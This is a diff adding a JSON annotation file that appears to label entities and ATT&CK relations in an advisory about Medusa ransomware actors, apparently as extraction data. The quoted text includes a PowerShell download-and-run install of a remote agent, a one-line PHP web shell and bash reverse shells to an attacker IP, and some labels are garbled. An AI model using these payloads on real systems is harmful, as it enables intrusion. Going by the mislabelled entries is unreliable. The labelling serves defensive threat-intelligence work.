@@ -1,0 +1,477 @@
+{
+  "mentions": [
+    {
+      "id": "m001",
+      "text": "Medusa actors",
+      "codes": [
+        "G"
+      ]
+    },
+    {
+      "id": "m002",
+      "text": "install.ps1",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m003",
+      "text": "ps1",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m004",
+      "text": "powershell.exe",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m005",
+      "text": "T1219",
+      "codes": [
+        "T"
+      ]
+    },
+    {
+      "id": "m006",
+      "text": "AnyDesk",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m007",
+      "text": "ConnectWise",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m008",
+      "text": "Splashtop. Medusa actors",
+      "codes": [
+        "G"
+      ]
+    },
+    {
+      "id": "m009",
+      "text": "Remote Desktop Protocol",
+      "codes": [
+        "T"
+      ]
+    },
+    {
+      "id": "m010",
+      "text": "T1021.001",
+      "codes": [
+        "T"
+      ]
+    },
+    {
+      "id": "m011",
+      "text": "PsExec",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m012",
+      "text": "T1569.002",
+      "codes": [
+        "T"
+      ]
+    },
+    {
+      "id": "m013",
+      "text": "TA0008",
+      "codes": [
+        "A"
+      ]
+    },
+    {
+      "id": "m014",
+      "text": "exfiltration",
+      "codes": [
+        "A"
+      ]
+    },
+    {
+      "id": "m015",
+      "text": "TA0010",
+      "codes": [
+        "A"
+      ]
+    },
+    {
+      "id": "m016",
+      "text": "T1486",
+      "codes": [
+        "T"
+      ]
+    }
+  ],
+  "choices": {
+    "m001_G": {
+      "name": "Medusa actors",
+      "type": "ThreatGroup",
+      "attack_id": null
+    },
+    "m002_S": {
+      "name": "install.ps1",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m003_S": {
+      "name": "ps1",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m004_S": {
+      "name": "powershell.exe",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m005_T": {
+      "name": "T1219",
+      "type": "Technique",
+      "attack_id": "T1219"
+    },
+    "m006_S": {
+      "name": "AnyDesk",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m007_S": {
+      "name": "ConnectWise",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m008_G": {
+      "name": "Splashtop. Medusa actors",
+      "type": "ThreatGroup",
+      "attack_id": null
+    },
+    "m009_T": {
+      "name": "Remote Desktop Protocol",
+      "type": "Technique",
+      "attack_id": "T1021.001"
+    },
+    "m010_T": {
+      "name": "T1021.001",
+      "type": "Technique",
+      "attack_id": "T1021.001"
+    },
+    "m011_S": {
+      "name": "PsExec",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m012_T": {
+      "name": "T1569.002",
+      "type": "Technique",
+      "attack_id": "T1569.002"
+    },
+    "m013_A": {
+      "name": "TA0008",
+      "type": "Tactic",
+      "attack_id": "TA0008"
+    },
+    "m014_A": {
+      "name": "exfiltration",
+      "type": "Tactic",
+      "attack_id": "TA0010"
+    },
+    "m015_A": {
+      "name": "TA0010",
+      "type": "Tactic",
+      "attack_id": "TA0010"
+    },
+    "m016_T": {
+      "name": "T1486",
+      "type": "Technique",
+      "attack_id": "T1486"
+    }
+  },
+  "units": {
+    "u001": {
+      "start": 0,
+      "end": 65,
+      "text": "Updated Aug. 18, 2026) FBI has also observed Medusa actors using:",
+      "line_start": 0
+    },
+    "u002": {
+      "start": 66,
+      "end": 71,
+      "text": "Nezha",
+      "line_start": 66
+    },
+    "u003": {
+      "start": 72,
+      "end": 212,
+      "text": "An operations and maintenance server monitoring tool used to allow backdoor visibility to compromised hosts from the threat actor’s machine.",
+      "line_start": 72
+    },
+    "u004": {
+      "start": 213,
+      "end": 242,
+      "text": "Publicly available on GitHub.",
+      "line_start": 213
+    },
+    "u005": {
+      "start": 243,
+      "end": 290,
+      "text": "Installed using PowerShell on victim’s machine:",
+      "line_start": 243
+    },
+    "u006": {
+      "start": 291,
+      "end": 741,
+      "text": "$env:NZ_SERVER=\"83.138.53.139:80\";$env:NZ_TLS=\"false\";$env:NZ_CLIENT_SECRET=\"…\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12;set-ExecutionPolicy RemoteSigned;Invoke-WebRequest https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.ps1 -OutFile C:install.ps1;powershell.exe C:install.ps1",
+      "line_start": 291
+    },
+    "u007": {
+      "start": 742,
+      "end": 751,
+      "text": "MeshAgent",
+      "line_start": 742
+    },
+    "u008": {
+      "start": 752,
+      "end": 873,
+      "text": "MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",
+      "line_start": 752
+    },
+    "u009": {
+      "start": 874,
+      "end": 903,
+      "text": "Publicly available on GitHub.",
+      "line_start": 874
+    },
+    "u010": {
+      "start": 904,
+      "end": 924,
+      "text": "Apache/PHP Web Shell",
+      "line_start": 904
+    },
+    "u011": {
+      "start": 925,
+      "end": 1021,
+      "text": "file_save.php executes the contents of a POST request sent to /file_save on a victim web server.",
+      "line_start": 925
+    },
+    "u012": {
+      "start": 1022,
+      "end": 1063,
+      "text": "For contents of file_save.php, see below:",
+      "line_start": 925
+    },
+    "u013": {
+      "start": 1064,
+      "end": 1124,
+      "text": "<?php if($_REQUEST[‘key’]==’UerT’) system($_REQUEST[‘x’]);?>",
+      "line_start": 1064
+    },
+    "u014": {
+      "start": 1125,
+      "end": 1143,
+      "text": "Bash Reverse Shell",
+      "line_start": 1125
+    },
+    "u015": {
+      "start": 1144,
+      "end": 1271,
+      "text": "Use of native Linux commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:",
+      "line_start": 1144
+    },
+    "u016": {
+      "start": 1272,
+      "end": 1315,
+      "text": "bash -i >& /dev/tcp/<attacker IP>/4444 0>&1",
+      "line_start": 1272
+    },
+    "u017": {
+      "start": 1316,
+      "end": 1358,
+      "text": "bash -i >& /dev/tcp/<attacker IP>/443 0>&1",
+      "line_start": 1316
+    },
+    "u018": {
+      "start": 1359,
+      "end": 1366,
+      "text": "GSocket",
+      "line_start": 1359
+    },
+    "u019": {
+      "start": 1367,
+      "end": 1408,
+      "text": "Also known as Global Socket or gs-netcat.",
+      "line_start": 1367
+    },
+    "u020": {
+      "start": 1409,
+      "end": 1491,
+      "text": "Allows workstations on different private networks to connect and bypass firewalls.",
+      "line_start": 1409
+    },
+    "u021": {
+      "start": 1492,
+      "end": 1536,
+      "text": "Allows file transfers and command execution.",
+      "line_start": 1492
+    },
+    "u022": {
+      "start": 1537,
+      "end": 1587,
+      "text": "Lateral Movement, Credential Access, and Execution",
+      "line_start": 1537
+    },
+    "u023": {
+      "start": 1588,
+      "end": 1710,
+      "text": "(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219].",
+      "line_start": 1588
+    },
+    "u024": {
+      "start": 1711,
+      "end": 1978,
+      "text": "To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop.",
+      "line_start": 1588
+    },
+    "u025": {
+      "start": 1979,
+      "end": 2209,
+      "text": "Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486].",
+      "line_start": 1588
+    },
+    "u026": {
+      "start": 2210,
+      "end": 2298,
+      "text": "When provided with valid username and password credentials, Medusa actors use PsExec to:",
+      "line_start": 1588
+    }
+  },
+  "captions": {},
+  "identities": {
+    "m001_G": "local:ThreatGroup:medusa actors",
+    "m002_S": "local:Software:install.ps1",
+    "m003_S": "attack:S0613",
+    "m004_S": "local:Software:powershell.exe",
+    "m005_T": "attack:T1219",
+    "m006_S": "local:Software:anydesk",
+    "m007_S": "attack:S0591",
+    "m008_G": "local:ThreatGroup:splashtop. medusa actors",
+    "m009_T": "attack:T1021.001",
+    "m010_T": "attack:T1021.001",
+    "m011_S": "attack:S0029",
+    "m012_T": "attack:T1569.002",
+    "m013_A": "attack:TA0008",
+    "m014_A": "attack:TA0010",
+    "m015_A": "attack:TA0010",
+    "m016_T": "attack:T1486"
+  },
+  "unavailable_choices": [],
+  "evidence_patterns": [
+    {
+      "unit_ids": [
+        "u023"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m001_G"
+      ],
+      "predicate": "USES_TECHNIQUE",
+      "tails": [
+        "m005_T"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u024"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m001_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m006_S",
+        "m007_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u025"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m011_S"
+      ],
+      "predicate": "USES_TECHNIQUE",
+      "tails": [
+        "m010_T",
+        "m012_T",
+        "m016_T"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u025"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m010_T",
+        "m012_T",
+        "m016_T"
+      ],
+      "predicate": "PART_OF_TACTIC",
+      "tails": [
+        "m013_A",
+        "m015_A"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u025"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m001_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m011_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u025"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m001_G"
+      ],
+      "predicate": "USES_TECHNIQUE",
+      "tails": [
+        "m010_T",
+        "m012_T",
+        "m016_T"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u026"
+      ],
+      "context_ids": [],
+      "heads": [
+        "m001_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m011_S"
+      ]
+    }
+  ]
+}
